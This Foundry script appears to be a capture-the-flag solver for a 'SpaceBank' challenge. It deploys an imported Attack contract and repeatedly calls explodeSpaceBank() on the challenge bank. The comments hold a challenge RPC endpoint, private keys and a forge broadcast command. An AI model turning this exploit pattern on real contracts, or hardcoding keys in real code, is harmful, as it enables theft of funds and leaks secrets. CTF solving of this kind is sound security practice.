// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "test/Bank.t.sol";
import "forge-std/Script.sol";
import {console} from "forge-std/Test.sol";
import {Script, console} from "forge-std/Script.sol";

contract Bank is Script {
    function setUp() public {}

    function run() external {
        uint256 privateKey = 0x5ec6b889f654aa746fa1e0f62642526bca5163dc27f35e740df216ff74367463;
        address target = 0x71f3FAf6a05484b026Df07330E654e603896650c;

        VmSafe.Wallet memory wallet = vm.createWallet(privateKey);
        address publicAddress = wallet.addr;
        console.log("publicAddress", publicAddress);
        console.log("eth balance: %e ", (publicAddress.balance));

        vm.startBroadcast(privateKey);
        Challenge challenge = Challenge(target);
        SpaceBank spacebank = challenge.SPACEBANK();
        console.log("spaceBank address", address(spacebank));
        SpaceToken token = SpaceToken(address(spacebank.token()));

        uint256 spaceBankBalance = token.balanceOf(address(spacebank));
        console.log("spaceBankBalance", spaceBankBalance);
        console.log("block number:", block.number);
        console.log("Is exploded", spacebank.exploded());
        if (spaceBankBalance == 0) {
            for (uint256 i = 0; i < 10; i++) {
                // spacebank.explodeSpaceBank();
                //make call directly
                (bool success,) = address(spacebank).call{gas: 2000000}(abi.encodeWithSignature("explodeSpaceBank()"));
                console.log("success", success);
            }
            return;
        }

        Attack attack = new Attack(address(challenge));
        console.log("block number:", block.number);
        console.log("attack address", address(attack));
        console.log("Is exploded", spacebank.exploded());
        // attack.kill{value: 1 wei}();

        // for (uint256 i = 0; i < 10; i++) {
        //     // spacebank.explodeSpaceBank();
        //     //make call directly

        //     (bool success,) = address(spacebank).call{gas: 2000000}(abi.encodeWithSignature("explodeSpaceBank()"));
        //     console.log("block number:", block.number);
        //     console.log("success", success);
        // }

        // console.log("spaceBankBalance", token.balanceOf(address(spacebank)));

        vm.stopBroadcast();
    }
}

// ---
// rpc endpoints:
//     - http://35.204.130.73:8545/VjrFHIDzOUspLEqYQhehMpaS/main
//     - ws://35.204.130.73:8545/VjrFHIDzOUspLEqYQhehMpaS/main/ws
// private key:        0x0b49634a1806a51e69decf63f876d3eb48755439779a13c6685b644daace34ec
// challenge contract: 0x976019eF0cD87c8cb54B95b04Ed64e40E842b8C0

// forge script  "Deploy" -w "src/script" \
//  -f "http://35.204.130.73:8545/VjrFHIDzOUspLEqYQhehMpaS/main" \
//  --private-key  "0x0b49634a1806a51e69decf63f876d3eb48755439779a13c6685b644daace34ec"
